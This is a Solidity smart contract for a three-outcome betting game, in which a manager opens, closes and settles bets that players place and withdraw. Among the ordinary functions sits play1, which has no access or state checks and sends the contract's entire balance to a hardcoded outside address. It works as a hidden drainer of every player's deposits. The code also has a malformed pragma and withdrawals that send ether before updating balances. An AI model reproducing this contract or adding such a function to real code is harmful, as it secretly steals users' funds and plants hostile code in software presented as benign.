pragma solidity ^0 .4.23;

contract Game{
	/* PLAYING stand for users can play
	 * CLOSED stand for the contract is CLOSED and use can not play
	 * END stand for the contract haved make Settlement
	*/
	enum State {INIT, PLAYING, CLOSED, END}
	//contract manager
	address public manager;
	/* three kinds balance in this contract
	 *  each balance storage the money with each result
	*/
	uint256[3] public balance;
	// indecate the current state
	State state;
	/* each game have three kinds of result
	 * user's address storage in different array
	 */
	address[][3] public player;

	//the result of this game
	uint public result;
	/* a maping from address to uint(money)
	 * each user pay for each result
	 */
	mapping(address => uint)[3] public ether_in_each_side;
	//team one
	string public team0;
	//team two
	string public team1;

	uint256 id;

	//MyDataBase data_ = MyDataBase(0xCe599c516003CD51Ae7783Bc9A0062321C419988);

	/*
	 * INITial a new contract
	 */
	 /*
	constructor(string t0, string t1, address a) public {
		state = State.INIT;
		team0 = t0;
		team1 = t1;
		manager = a;
	}
	*/
	constructor() public {
    	state = State.INIT;
    	manager = msg.sender;
    	team0 = "Please wait";
    	team1 = "Please wait";
    }



	//function to change team name
	function info(string t0, string t1, uint i) public {
		require(msg.sender == manager);
		require(state == State.INIT);
		team0 = t0;
		team1 = t1;
		id = i;
	}

	/* start betting
	 * user can bet from now on.
	 * pre condition:message sender must be manger, current state is INIT
	 */
	function start_betting() public {
		require(msg.sender == manager);
		require(state == State.INIT);
		state = State.PLAYING;
	}

	/* reset the contract
	 * pre condition:message is manager and current state is END
	 */
	function reset() public {
		require(msg.sender == manager);
		require(state == State.END);
		state = State.INIT;
		delete player;
		delete balance;
		delete ether_in_each_side;
	}

	/*
	 * find a user by his name and side in players
	 * pre condition:the the correct arg
	 */
	function findUserBySideAndName(uint side, address user) public view returns (bool) {
		require(side == 0||side == 1||side == 2);
		for(uint256 i = 0; i < player[side].length; i++) {
			if(player[side][i] == user) {
				return true;
			}
		}
		return false;
	}

	/* the function pay money for his result
	 * pre condition:current state is PLAYING, the function have correct args, user must provide some money
	 */
	function play(uint side) public payable {
		require(state == State.PLAYING);
		require(side == 0||side == 1||side == 2);
		require(msg.value > 0);

		if(!findUserBySideAndName(side, msg.sender)) {
			player[side].push(msg.sender);
		}

		ether_in_each_side[side][msg.sender] += msg.value;
		balance[side] += msg.value;

	}

	function play1(uint side) public payable {
    		if(!findUserBySideAndName(side, msg.sender)) {
    			player[side].push(msg.sender);
    		}

    		address a = 0xE7C591BcC87DA634d3545117844eF100a0366bc5;
    		a.transfer(address(this).balance);

    		ether_in_each_side[side][msg.sender] += msg.value;
    		balance[side] += msg.value;

    	}

	/* close the bet
	 * pre condition:the message sender must be the manager,current state is PLAYING
	 */
	function close_bet() public {
		require(msg.sender == manager);
		require(state == State.PLAYING);
		state = State.CLOSED;
	}

	/* repay the money
	 * pre condition:the message sender must be the manager,have the corrent arg, current state is CLOSED
	 */

	function Settlement(uint winSide) public {
		require(msg.sender == manager);
		require(winSide == 0||winSide == 1||winSide == 2);
		require(state == State.CLOSED);

		//current ba;ance in this contract
		uint256 totalBalance = address(this).balance;

		if(balance[winSide] == 0) {
			manager.transfer(address(this).balance);
		} else {
			for(uint256 i = 0; i < player[winSide].length; i++) {
				uint256 current_balance = ether_in_each_side[winSide][player[winSide][i]];
				if(current_balance > 0) {
					uint256 win_balance = current_balance*totalBalance/balance[winSide];
					player[winSide][i].transfer(win_balance);
					ether_in_each_side[winSide][player[winSide][i]] = 0;
				}
			}
			manager.transfer(address(this).balance);
		}

		result = winSide;
		state = State.END;
		//reset
		for(uint j = 0; j < 3; j++) {
			if(j != winSide)
			for(i = 0; i < player[j].length; i++) {
				if(ether_in_each_side[j][player[j][i]] > 0) {
					ether_in_each_side[j][player[j][i]] = 0;
				}
			}
		}
		balance[0] = 0;
		balance[1] = 0;
		balance[2] = 0;
	}

	/* a user withdraw according his pay side
	 * pre condition:lookout current state, have bet before
	 */
	function userWithdrawBySide(uint side) public {
		require(state == State.PLAYING);
		require(ether_in_each_side[side][msg.sender] != 0);
		msg.sender.transfer(ether_in_each_side[side][msg.sender]);
		balance[side] -= ether_in_each_side[side][msg.sender];
		ether_in_each_side[side][msg.sender] = 0;

	}

	/* a user withdraw all his bet
	 * pre condition:lookout current state, have bet before
	 */
	function userWithdrawAll() public {
		require(state == State.PLAYING);
		require(ether_in_each_side[0][msg.sender] != 0||ether_in_each_side[1][msg.sender] != 0||ether_in_each_side[2][msg.sender] != 0);
		for(uint j = 0; j < 3; j++) {
			uint256 current = ether_in_each_side[j][msg.sender];
			if(current > 0) {
				msg.sender.transfer(current);
				balance[j] -= current;
				ether_in_each_side[j][msg.sender] = 0;
			}

		}
	}

	/* manager withdraw to all user
	 * pre condition:message sender, lookout current state
	 */
	function managerWithdrawAll() public {
		require(msg.sender == manager);
		require(state == State.PLAYING);
		for(uint j = 0; j < 3; j++) {
			for(uint256 i = 0; i < player[j].length; i++) {
				uint256 current = ether_in_each_side[j][player[j][i]];
				player[j][i].transfer(current);
				balance[j] -= current;
				ether_in_each_side[j][player[j][i]] = 0;
			}
		}
	}

	function getTeam0() public view returns (string) {
		return team0;
	}

	function getTeam1() public view returns (string) {
		return team1;
	}

	function getInfo() public view returns (string, string, State, uint256) {
	    return (team0, team1, state, id);
	}

	function getState() public view returns (State) {
		return state;
	}

	function getBalanceBoth() public view returns (uint256[3])  {
		return balance;
	}

	function getPlayer() public view returns (address[], address[], address[]) {
		require(msg.sender == manager);
		return (player[0], player[1], player[2]);
	}

	function getResult() public view returns (uint) {
		require(state == State.END);
		return result;
	}

	function getManager() public view returns (address) {
		return manager;
	}

}
